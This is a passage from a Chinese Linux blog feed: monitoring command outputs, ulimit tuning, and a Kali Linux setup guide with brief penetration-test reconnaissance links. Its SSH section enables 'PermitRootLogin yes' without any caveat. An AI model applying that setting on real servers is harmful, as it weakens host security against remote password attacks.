%util</span><br><span class="line">mmcblk0          0.00    0.00      0.00      0.00     0.00     0.00   0.00   0.00    0.00    0.00   0.00     0.00     0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  %util</span><br><span class="line">mmcblk0          0.00    7.50      0.00     34.00     0.00     1.00   0.00  11.76    0.00    7.00   0.05     0.00     4.53   0.80   0.60</span><br></pre></td></tr></table></figure>

<h1 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># sar -u 2 5 </span></span><br><span class="line">Linux 5.10.78-Release-OPENFANS+20211111-v8 (raspbian)   09/04/2022      _aarch64_       (4 CPU)</span><br><span class="line"></span><br><span class="line">10:32:27 AM     CPU     %user     %<span class="built_in">nice</span>   %system   %iowait    %steal     %idle</span><br><span class="line">10:32:29 AM     all      1.38      0.00      1.00      0.00      0.00     97.62</span><br><span class="line">10:32:31 AM     all      7.50      0.00      1.38      0.00      0.00     91.12</span><br><span class="line">10:32:33 AM     all      0.25      0.00      0.87      0.00      0.00     98.88</span><br><span class="line">10:32:35 AM     all      0.25      0.00      0.00      0.00      0.00     99.75</span><br><span class="line">10:32:37 AM     all      0.50      0.00      0.13      0.00      0.00     99.37</span><br><span class="line">Average:        all      1.97      0.00      0.67      0.00      0.00     97.35</span><br></pre></td></tr></table></figure>

<h1 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h1><p>查看端口服务，-i查看对应端口服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># lsof -i:22</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">sshd      834 root    3u  IPv4  26704      0t0  TCP *:ssh (LISTEN)</span><br><span class="line">sshd      834 root    4u  IPv6  26706      0t0  TCP *:ssh (LISTEN)</span><br><span class="line">BT-Panel 1147 root   13u  IPv4  43447      0t0  TCP raspbian:11716-&gt;raspbian:ssh (ESTABLISHED)</span><br><span class="line">sshd     4694 root    3u  IPv4  42753      0t0  TCP raspbian:ssh-&gt;raspbian:11716 (ESTABLISHED)</span><br></pre></td></tr></table></figure>

<h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># netstat </span></span><br><span class="line">Active Internet connections (w/o servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State      </span><br><span class="line">tcp        0      6 10.71.10.25:8101        10.68.65.140:5937       ESTABLISHED</span><br><span class="line">tcp        0    176 raspbian:ssh            raspbian:11716          ESTABLISHED</span><br><span class="line">tcp      160      0 raspbian:11716          raspbian:ssh            ESTABLISHED</span><br><span class="line">Active UNIX domain sockets (w/o servers)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node   Path</span><br><span class="line">unix  2      [ ]         DGRAM                    43560    /run/user/0/systemd/notify</span><br><span class="line">unix  3      [ ]         DGRAM                    15265    /run/systemd/notify</span><br><span class="line">unix  16     [ ]         DGRAM                    15276    /run/systemd/journal/dev-log</span><br><span class="line">unix  2      [ ]         DGRAM                    15282    /run/systemd/journal/syslog</span><br><span class="line">unix  7      [ ]         DGRAM                    15291    /run/systemd/journal/socket</span><br><span class="line">unix  2      [ ]         DGRAM                    24174    @00001</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     22269    </span><br><span class="line">unix  2      [ ]         DGRAM                    27827    </span><br><span class="line">unix  2      [ ]         DGRAM                    22165    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21099    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     22163    </span><br><span class="line">unix  2      [ ]         DGRAM                    22143    </span><br><span class="line">unix  2      [ ]         DGRAM                    22139    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     22433    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     22432    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     19284    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26018    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26017    </span><br><span class="line">unix  2      [ ]         DGRAM                    25873    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25871    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25870    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18705    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     27250    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25862    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     30216    /run/containerd/containerd.sock.ttrpc</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     32039    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18236    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     29646    /run/containerd/containerd.sock.ttrpc</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20201    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     32038    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20289    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     29570    /run/containerd/s/efda43ab145a8b986f0fd3455c3b2956d5def686d2807c67031ad6563f9958db</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     31928    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     24063    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20541    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     27836    </span><br><span class="line">unix  2      [ ]         DGRAM                    16406    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20777    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     43564    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21400    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20542    </span><br><span class="line">unix  2      [ ]         DGRAM                    14168    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21401    </span><br><span class="line">unix  2      [ ]         DGRAM                    18426    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     44613    /run/systemd/journal/stdout</span><br><span class="line">unix  2      [ ]         DGRAM                    18148    </span><br><span class="line">unix  2      [ ]         DGRAM                    43546    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     24181    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18312    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18430    </span><br><span class="line">unix  2      [ ]         DGRAM                    41797    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     28070    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18313    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21097    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     17383    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         DGRAM                    15267    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25700    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     43538    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     17927    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25701    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     41806    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18147    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     16734    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20214    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         DGRAM                    15266    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     14309    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         DGRAM                    43561    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     27733    </span><br><span class="line">unix  2      [ ]         DGRAM                    16736    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26790    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         DGRAM                    16739    </span><br><span class="line">unix  2      [ ]         DGRAM                    43549    </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     41786    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25802    </span><br><span class="line">unix  3      [ ]         DGRAM                    16740    </span><br><span class="line">unix  3      [ ]         DGRAM                    43562    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26994    /run/systemd/journal/stdout</span><br><span class="line">unix  2      [ ]         DGRAM                    20539    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20421    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21092    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18951    </span><br><span class="line">unix  2      [ ]         DGRAM                    23682    </span><br><span class="line">unix  2      [ ]         DGRAM                    20376    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26990    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21100    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18774    </span><br><span class="line">unix  2      [ ]         DGRAM                    23957    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26995    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21091    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     22616    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21096    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18237    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     25678    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21101    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     29575    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21083    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20213    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     24486    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20428    </span><br><span class="line">unix  2      [ ]         DGRAM                    21055    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     28819    /run/containerd/containerd.sock</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21098    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21056    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18933    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     23569    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21035    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21095    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     22801    /run/systemd/journal/stdout</span><br><span class="line">unix  2      [ ]         DGRAM                    21054    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21093    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     19104    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     28821    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21034    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     21094    /var/run/dbus/system_bus_socket</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     28525    /run/containerd/containerd.sock</span><br><span class="line">unix  2      [ ]         DGRAM                    19014    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20929    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     23753    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     31073    /run/containerd/s/f173b4c37ec27fe764ea6843063c75576d07f7ac21d51986b75d8e816f41033e</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18929    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     24056    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     26698    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20778    /run/systemd/journal/stdout</span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     18853    </span><br><span class="line">unix  2      [ ]         DGRAM                    23961    </span><br><span class="line">unix  2      [ ]         DGRAM                    18992    </span><br><span class="line">unix  3      [ ]         STREAM     CONNECTED     20853 </span><br></pre></td></tr></table></figure>

<h1 id="top、htop"><a href="#top、htop" class="headerlink" title="top、htop"></a>top、htop</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># top</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># htop</span></span><br></pre></td></tr></table></figure>

<h1 id="last"><a href="#last" class="headerlink" title="last"></a>last</h1><p>last可用查看用户登录系统的记录，包括用户名、登录的远程名称或者ip地址以及登录时间。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># last</span></span><br><span class="line">root     pts/0        127.0.0.1        Sun Sep  4 09:43   still logged <span class="keyword">in</span></span><br><span class="line">root     pts/0        127.0.0.1        Sun Sep  4 09:16 - 09:36  (00:20)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00   still running</span><br><span class="line">root     pts/0        10.8.3.28        Sat Sep  3 10:07 - 10:07  (00:00)</span><br><span class="line">root     pts/0        127.0.0.1        Sat Sep  3 09:13 - 09:15  (00:01)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00   still running</span><br><span class="line">root     pts/0        10.8.3.28        Fri Sep  2 13:17 - crash (-19237+05:17)</span><br><span class="line">root     pts/1        127.0.0.1        Thu Sep  1 10:42 - 10:51  (00:08)</span><br><span class="line">root     pts/0        10.8.3.28        Thu Sep  1 10:10 - 13:45  (03:35)</span><br><span class="line">root     pts/1        10.71.22.140     Thu Sep  1 08:55 - 09:33  (00:38)</span><br><span class="line">root     pts/1        10.71.22.140     Thu Sep  1 08:40 - 08:54  (00:14)</span><br><span class="line">root     pts/0        10.71.22.140     Thu Sep  1 08:38 - 09:33  (00:55)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00   still running</span><br><span class="line">root     pts/0        10.8.3.28        Wed Aug 31 23:58 - crash (-19235+15:58)</span><br><span class="line">root     pts/1        10.8.3.28        Wed Aug 31 23:13 - crash (-19235+15:13)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 23:11 - 23:50  (00:38)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 23:06 - 23:11  (00:04)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 23:03 - 23:06  (00:02)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 23:02 - 23:02  (00:00)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 23:00 - 23:02  (00:02)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 22:57 - 22:58  (00:01)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 22:54 - 22:56  (00:02)</span><br><span class="line">root     pts/0        127.0.0.1        Wed Aug 31 22:31 - 22:52  (00:21)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:28 - 14:29  (00:00)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:28 - 14:28  (00:00)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:19 - 14:19  (00:00)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:19 - 14:19  (00:00)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:16 - 14:19  (00:02)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00   still running</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:14 - down   (00:00)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:13 - 14:14  (00:00)</span><br><span class="line">root     pts/0        10.73.159.18     Wed Aug 31 14:10 - 14:13  (00:02)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 22:26 - 14:10  (15:43)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 20:46 - 22:26  (01:39)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 20:42 - 20:45  (00:02)</span><br><span class="line">root     pts/2        10.67.44.114     Tue Aug 30 20:11 - 20:13  (00:01)</span><br><span class="line">root     pts/2        127.0.0.1        Tue Aug 30 20:09 - 20:10  (00:01)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 18:33 - 20:31  (01:58)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 17:31 - 18:33  (01:01)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 16:49 - 16:58  (00:09)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 15:57 - 16:27  (00:30)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 14:56 - 15:06  (00:10)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 14:48 - 14:51  (00:02)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 14:36 - 14:44  (00:08)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 14:21 - 14:24  (00:02)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 13:34 - 14:20  (00:45)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 13:13 - 13:14  (00:00)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 12:43 - 13:13  (00:29)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 12:31 - 12:39  (00:08)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 14:14 (19235+06:14)</span><br><span class="line">root     pts/1        127.0.0.1        Tue Aug 30 12:12 - down   (00:17)</span><br><span class="line">root     pts/1        127.0.0.1        Tue Aug 30 12:12 - 12:12  (00:00)</span><br><span class="line">root     pts/0        127.0.0.1        Tue Aug 30 12:10 - down   (00:19)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 12:30 (19234+04:30)</span><br><span class="line">root     pts/0        127.0.0.1        Mon Aug 29 08:57 - 10:01  (01:04)</span><br><span class="line">root     pts/0        127.0.0.1        Mon Aug 29 08:49 - 08:57  (00:08)</span><br><span class="line">root     pts/0        127.0.0.1        Mon Aug 29 08:16 - 08:17  (00:01)</span><br><span class="line">root     pts/0        127.0.0.1        Mon Aug 29 08:16 - 08:16  (00:00)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 12:30 (19234+04:30)</span><br><span class="line">root     pts/0        10.8.3.28        Sun Aug 28 21:53 - 22:10  (00:17)</span><br><span class="line">root     pts/0        10.8.3.28        Sun Aug 28 20:17 - 21:44  (01:27)</span><br><span class="line">root     pts/0        10.8.3.28        Sun Aug 28 20:12 - 20:12  (00:00)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 12:30 (19234+04:30)</span><br><span class="line">root     pts/0        192.168.1.100    Sun Aug 28 13:27 - crash (-19232+05:27)</span><br><span class="line">pi       pts/0        192.168.1.100    Sun Aug 28 01:10 - 01:15  (00:04)</span><br><span class="line">root     pts/1        127.0.0.1        Sun Aug 28 00:45 - 00:45  (00:00)</span><br><span class="line">root     pts/1        127.0.0.1        Sun Aug 28 00:45 - 00:45  (00:00)</span><br><span class="line">pi       pts/0        192.168.1.100    Sun Aug 28 00:30 - 01:09  (00:38)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 12:30 (19234+04:30)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 18:13 (17941+10:13)</span><br><span class="line">reboot   system boot  5.10.78-Release- Thu Jan  1 08:00 - 18:12 (17941+10:12)</span><br><span class="line"></span><br><span class="line">wtmp begins Thu Jan  1 08:00:03 1970</span><br></pre></td></tr></table></figure>

<h1 id="ulimit"><a href="#ulimit" class="headerlink" title="ulimit"></a>ulimit</h1><blockquote>
<p>Too many open files是Linux系统中常见的错误，从字面意思上看就是说程序打开的文件数过多，不过这里的files不单是文件的意思，也包括打开的通讯链接(比如socket)，正在监听的端口等等，所以有时候也可以叫做句柄(handle)，这个错误通常也可以叫做句柄数超出系统限制。引起的原因就是进程在某个时刻打开了超过系统限制的文件数量以及通讯链接数。</p>
</blockquote>
<p>通过命令ulimit -a可以查看当前系统设置的最大句柄数是多少</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 31767</span><br><span class="line">max locked memory       (kbytes, -l) 64</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 8192</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 31767</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br></pre></td></tr></table></figure>

<p>可以看到，open files的配置是1024，可以通过如下命令将open files增加</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br></pre></td></tr></table></figure>

<p>这种修改方式可以临时把文件打开数量增加到65535，但是系统重启后这个配置会失效。</p>
<p>还有一种方式是修改系统的配置文件，以Ubuntu为例，配置文件默认在</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/security/limits.conf</span><br></pre></td></tr></table></figure>

<p>在这个配置文件中增加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* soft nofile 65535</span><br><span class="line">* hard nofile 65535</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux小知识</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 系统基础配置（2023版）</title>
    <url>/2022/07/19/kali-%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%EF%BC%882022%E7%89%88%EF%BC%89/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="kali-系统基础配置（2023版）"><a href="#kali-系统基础配置（2023版）" class="headerlink" title="kali 系统基础配置（2023版）"></a>kali 系统基础配置（2023版）</h1><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p><strong>然后将原有的源全部注释掉，然后插入下面这串源地址</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>在<strong>etc</strong>模式下输入这个   :set nu   可以看到行号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#deb 代表软件位置，deb-src 代表软件的源代码的位置</span></span><br></pre></td></tr></table></figure>

<h2 id="apt-命令和知识"><a href="#apt-命令和知识" class="headerlink" title="apt 命令和知识"></a>apt 命令和知识</h2><p><strong>使用apt 新的软件包获取最新的软件包列表。</strong></p>
<p>**注意：apt update 的作用是从&#x2F;etc&#x2F;apt&#x2F;sources.list 文件中定义的源中获取的最新的软件包列表。即运行apt update 并没有更新软件，而是相当于windows下面的检查更新，获取的是软件的状态。 **</p>
<p><strong>Kali apt 源的软件包类型说明：</strong></p>
<p><strong>dists 区域           软件包组件标准</strong></p>
<p><strong>main					遵从Debian 自由软件指导方针（DFSG），并且不依赖 non-free</strong></p>
<p><strong>contrib				遵从Debian 自由软件指导方针（DFSG)，但依赖于 non-free</strong>			</p>
<p><strong>non-free			不遵从Debian 自由软件指导方针（DFSG)</strong></p>
<p><strong>注意：DFSG是Debian 自由软件指导方针</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update   <span class="comment">#更新列表</span></span><br><span class="line">sudo apt upgrade  <span class="comment">#从更新列表中升级软件包，升级时软件包有相依性的问题，次软件包就不会被升级。</span></span><br><span class="line">sudo dist-upgrade <span class="comment">#升级时，软件包有相依性问题，会移除旧版，直接安装新版本。（所以通常dist-upgrade被认为是有风险的升级）（移除旧版升级新版容易出现A依赖B的旧版，但是B升级了新版，但是A只能用B的旧版，所以A出现问题）</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/19/kali-%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%EF%BC%882022%E7%89%88%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(56).png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install     <span class="comment">#安装软件包</span></span><br><span class="line">sudo apt remove      <span class="comment">#移除软件包</span></span><br></pre></td></tr></table></figure>

<h2 id="网络配置-ip、子网、网关、DNS"><a href="#网络配置-ip、子网、网关、DNS" class="headerlink" title="网络配置(ip、子网、网关、DNS)"></a>网络配置(ip、子网、网关、DNS)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p><strong>写入这个静态ip和网络信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0                  <span class="comment">#使用这块网卡，不写这个网络配置相当于没用</span></span><br><span class="line">iface eth0 inet static     <span class="comment">#配置eth0使用静态地址</span></span><br><span class="line">address 192.168.1.53       <span class="comment">#配置eth0的固定ip地址</span></span><br><span class="line">netmask 255.255.255.0      <span class="comment">#配置子网掩码</span></span><br><span class="line">gateway 192.168.1.1        <span class="comment">#配置网关</span></span><br></pre></td></tr></table></figure>

<p><strong>配置DNS信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf    </span><br></pre></td></tr></table></figure>



 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Generated by NetworkManager</span></span><br><span class="line">search localdmain</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking.service    <span class="comment">#重启网络服务</span></span><br><span class="line"><span class="comment">#或者用</span></span><br><span class="line">/etc/init.d/networking restart          <span class="comment">#重启网络服务</span></span><br></pre></td></tr></table></figure>

<h2 id="启动ssh服务"><a href="#启动ssh服务" class="headerlink" title="启动ssh服务"></a>启动ssh服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p><strong>插入这几行配置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p><strong>然后重启ssh服务，并设置开机自启</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p><a href="https://whois.chinaz.com/">站长之家</a></p>
<p><a href="https://whois.aliyun.com/">万网whois</a></p>
<h3 id="在线网站备案"><a href="#在线网站备案" class="headerlink" title="在线网站备案"></a>在线网站备案</h3><p><a href="https://www.tianyancha.com/">天眼查</a></p>
<p><a href="https://www.beianx.cn/">ICP备案查询网</a></p>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p><a href="https://fofa.info/toLogin">1.FOFA</a>	title&#x3D;“公司名称”</p>
<p><a href="https://www.baidu.com/">2.百度</a>	intitle&#x3D;“公司名称”</p>
<p><a href="https://www.google.com/">3.Google</a>	intitle&#x3D;“公司名称”</p>
<p><a href="https://www.zoomeye.org/">4.钟馗之眼</a>	site:域名</p>
<h3 id="dns信息收集"><a href="#dns信息收集" class="headerlink" title="dns信息收集"></a>dns信息收集</h3><h2 id="KALI-的渗透软件"><a href="#KALI-的渗透软件" class="headerlink" title="KALI 的渗透软件"></a>KALI 的渗透软件</h2><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
  </entry>
  <entry>
    <title>linux常用系统源</title>
    <url>/2023/05/15/linux%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%BA%90/</url>
